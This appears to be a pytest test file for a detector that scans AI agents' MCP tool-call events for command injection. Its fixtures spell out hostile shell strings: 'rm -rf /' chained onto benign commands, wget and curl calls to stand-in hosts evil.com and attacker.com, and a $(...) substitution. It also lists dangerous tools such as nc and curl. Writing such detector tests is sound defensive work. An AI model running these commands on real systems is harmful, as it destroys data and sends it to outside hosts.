import pytest
from engines.command_injection_engine import CommandInjectionEngine


@pytest.mark.unit
class TestCommandInjectionEngine:
    """Test CommandInjectionEngine detection capabilities"""

    def test_engine_initialization(self, mock_db):
        """Test engine initializes correctly"""
        engine = CommandInjectionEngine(mock_db)
        assert engine.name == 'CommandInjectionEngine'
        assert 'MCP' in engine.event_types
        assert 'local' in engine.producers
        assert 'remote' in engine.producers

    def test_should_process_valid_event(self, mock_db, sample_mcp_event):
        """Test engine accepts valid MCP events from local/remote producers"""
        engine = CommandInjectionEngine(mock_db)
        assert engine.should_process(sample_mcp_event) is True

    def test_should_not_process_invalid_producer(self, mock_db):
        """Test engine rejects events from invalid producers"""
        engine = CommandInjectionEngine(mock_db)
        event = {
            'eventType': 'MCP',
            'producer': 'invalid',
            'data': {}
        }
        assert engine.should_process(event) is False

    def test_detect_critical_command_injection(self, mock_db):
        """Test detection of critical command injection patterns"""
        engine = CommandInjectionEngine(mock_db)

        critical_payloads = [
            {
                'eventType': 'MCP',
                'producer': 'local',
                'ts': 1234567890,
                'data': {
                    'message': {
                        'params': {
                            'arguments': {'command': 'ls; rm -rf /'}
                        }
                    }
                }
            },
            {
                'eventType': 'MCP',
                'producer': 'local',
                'ts': 1234567891,
                'data': {
                    'message': {
                        'params': {
                            'arguments': {'command': 'cat file | rm -rf /home'}
                        }
                    }
                }
            },
            {
                'eventType': 'MCP',
                'producer': 'local',
                'ts': 1234567892,
                'data': {
                    'message': {
                        'params': {
                            'arguments': {'command': 'eval("malicious code")'}
                        }
                    }
                }
            },
        ]

        for payload in critical_payloads:
            result = engine.process(payload)
            assert result is not None, f"Failed to detect: {payload}"
            assert result['result']['severity'] == 'high'
            assert result['result']['detector'] == 'CommandInjection'
            assert len(result['result']['findings']) > 0

    def test_detect_high_risk_patterns(self, mock_db):
        """Test detection of high-risk command injection patterns"""
        engine = CommandInjectionEngine(mock_db)

        high_risk_payloads = [
            'ls; wget http://evil.com/malware.sh',
            'cat file && bash exploit.sh',
            'echo test | curl -X POST http://attacker.com',
            '$(rm -rf /tmp)',
            '`curl http://evil.com`',
        ]

        for payload in high_risk_payloads:
            event = {
                'eventType': 'MCP',
                'producer': 'local',
                'ts': 1234567890,
                'data': {
                    'message': {
                        'params': {
                            'arguments': {'command': payload}
                        }
                    }
                }
            }
            result = engine.process(event)
            assert result is not None, f"Failed to detect: {payload}"
            assert result['result']['severity'] in ['high', 'medium']

    def test_detect_medium_risk_patterns(self, mock_db):
        """Test detection of medium-risk command patterns"""
        engine = CommandInjectionEngine(mock_db)

        medium_risk_payloads = [
            'cmd /c dir',
            'bash -c "echo test"',
            'powershell Get-Process',
            'ping -t 10 8.8.8.8',
        ]

        for payload in medium_risk_payloads:
            event = {
                'eventType': 'MCP',
                'producer': 'local',
                'ts': 1234567890,
                'data': {
                    'message': {
                        'params': {
                            'arguments': {'command': payload}
                        }
                    }
                }
            }
            result = engine.process(event)
            assert result is not None, f"Failed to detect: {payload}"
            assert result['result']['severity'] == 'medium'

    def test_no_detection_for_safe_commands(self, mock_db):
        """Test engine doesn't flag safe commands"""
        engine = CommandInjectionEngine(mock_db)

        safe_payloads = [
            'ls -la',
            'cat file.txt',
            'echo "Hello World"',
            'pwd',
            'date',
        ]

        for payload in safe_payloads:
            event = {
                'eventType': 'MCP',
                'producer': 'local',
                'ts': 1234567890,
                'data': {
                    'message': {
                        'params': {
                            'arguments': {'command': payload}
                        }
                    }
                }
            }
            result = engine.process(event)
            # Should return None for safe commands
            assert result is None, f"False positive for safe command: {payload}"

    def test_dangerous_command_detection(self, mock_db):
        """Test detection of dangerous commands"""
        engine = CommandInjectionEngine(mock_db)

        dangerous_commands = ['rm', 'del', 'wget', 'curl', 'nc', 'chmod']

        for cmd in dangerous_commands:
            event = {
                'eventType': 'MCP',
                'producer': 'local',
                'ts': 1234567890,
                'data': {
                    'message': {
                        'params': {
                            'arguments': {'command': f'{cmd} test'}
                        }
                    }
                }
            }
            result = engine.process(event)
            assert result is not None, f"Failed to detect dangerous command: {cmd}"
            assert any(cmd in str(finding) for finding in result['result']['findings'])

    def test_score_calculation(self, mock_db):
        """Test risk score calculation"""
        engine = CommandInjectionEngine(mock_db)

        # High severity should have high score
        assert engine._calculate_score('high', 1) >= 85
        assert engine._calculate_score('high', 5) >= 90

        # Medium severity should have medium score
        assert 40 <= engine._calculate_score('medium', 1) <= 60

        # None severity should have zero score
        assert engine._calculate_score('none', 0) == 0

        # Score should not exceed 100
        assert engine._calculate_score('high', 100) <= 100

    def test_extract_analysis_text(self, mock_db):
        """Test text extraction from MCP events"""
        engine = CommandInjectionEngine(mock_db)

        event = {
            'eventType': 'MCP',
            'producer': 'local',
            'data': {
                'task': 'Run command',
                'message': {
                    'method': 'tools/call',
                    'params': {
                        'name': 'bash',
                        'arguments': {'cmd': 'ls -la'}
                    }
                }
            }
        }

        text = engine._extract_analysis_text(event)
        assert 'Run command' in text
        assert 'tools/call' in text
        assert 'bash' in text
        assert 'ls -la' in text

    def test_multiple_findings(self, mock_db):
        """Test detection of multiple patterns in single payload"""
        engine = CommandInjectionEngine(mock_db)

        event = {
            'eventType': 'MCP',
            'producer': 'local',
            'ts': 1234567890,
            'data': {
                'message': {
                    'params': {
                        'arguments': {
                            'command': 'rm -rf / && wget http://evil.com && curl -X POST http://attacker.com'
                        }
                    }
                }
            }
        }

        result = engine.process(event)
        assert result is not None
        assert len(result['result']['findings']) > 2
        assert result['result']['severity'] == 'high'

    @pytest.mark.asyncio
    async def test_handle_event(self, mock_db, malicious_mcp_event):
        """Test async event handling"""
        engine = CommandInjectionEngine(mock_db)
        result = await engine.handle_event(malicious_mcp_event)

        assert result is not None
        assert result['result']['detector'] == 'CommandInjection'
        assert result['result']['severity'] == 'high'

    def test_result_structure(self, mock_db, malicious_mcp_event):
        """Test the structure of detection results"""
        engine = CommandInjectionEngine(mock_db)
        result = engine.process(malicious_mcp_event)

        assert result is not None
        assert 'reference' in result
        assert 'result' in result

        result_data = result['result']
        assert 'detector' in result_data
        assert 'severity' in result_data
        assert 'evaluation' in result_data
        assert 'findings' in result_data
        assert 'event_type' in result_data
        assert 'analysis_text' in result_data
        assert 'original_event' in result_data

        # Check findings structure
        for finding in result_data['findings']:
            assert 'category' in finding
            assert 'pattern' in finding
            assert 'matched_text' in finding
            assert 'reason' in finding
